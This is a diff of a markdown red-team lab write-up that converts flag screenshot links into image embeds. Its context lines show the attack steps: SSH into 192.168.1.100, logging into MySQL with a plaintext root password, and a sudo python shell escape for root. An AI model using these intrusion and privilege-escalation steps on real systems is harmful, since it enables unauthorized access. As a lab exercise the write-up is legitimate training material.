@@ -48,7 +48,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 	-ssh michael@192.168.1.100
 -cd /var/www/html
 -grep -ER flag1
-https://github.com/juan-desu/Attack-Defense-Analysis-of-a-Vulnerable-Network/blob/main/flags/flag%201.png
+![alt text](https://github.com/juan-desu/Attack-Defense-Analysis-of-a-Vulnerable-Network/blob/main/flags/flag%201.png)
   - `flag2.txt`: fc3fd58dcdad9ab23faca6e9a36e581c
     - **Exploit Used**
       -Weak Password / SSH with password
@@ -57,7 +57,7 @@ https://github.com/juan-desu/Attack-Defense-Analysis-of-a-Vulnerable-Network/blo
 	- ssh michael@192.168.1.100
 - cd /var/www
 - cat flag2.txt
-https://github.com/juan-desu/Attack-Defense-Analysis-of-a-Vulnerable-Network/blob/main/flags/Flag%202.png
+![alt text](https://github.com/juan-desu/Attack-Defense-Analysis-of-a-Vulnerable-Network/blob/main/flags/Flag%202.png)
   - `flag3.txt`: afc01ab56b50591e7dccf93122770cd2
     - **Exploit Used**
       - Database credentials in plain text
@@ -68,7 +68,7 @@ https://github.com/juan-desu/Attack-Defense-Analysis-of-a-Vulnerable-Network/blo
 - mysql --user root --password # Password is R@v3nSecurity
 -mysql> SELECT post_title, post_content FROM wp_posts WHERE post_title LIKE "flag%";
 - This returned the value for flag 3
-https://github.com/juan-desu/Attack-Defense-Analysis-of-a-Vulnerable-Network/blob/main/flags/Flag%203-4.png
+![alt text](https://github.com/juan-desu/Attack-Defense-Analysis-of-a-Vulnerable-Network/blob/main/flags/Flag%203-4.png)
   - `flag4.txt`: flag4.txt: 715dea6c055b9fe3337544932f2941ce
     - **Exploit Used**
       - python can run with sudo
@@ -79,5 +79,4 @@ https://github.com/juan-desu/Attack-Defense-Analysis-of-a-Vulnerable-Network/blo
       - Commands run
 - python -c 'import os; os.system("/bin/sh")'
 - cat flag4.txt
-https://github.com/juan-desu/Attack-Defense-Analysis-of-a-Vulnerable-Network/blob/main/flags/Flag%204.png
-
+![alt text](https://github.com/juan-desu/Attack-Defense-Analysis-of-a-Vulnerable-Network/blob/main/flags/Flag%204.png)
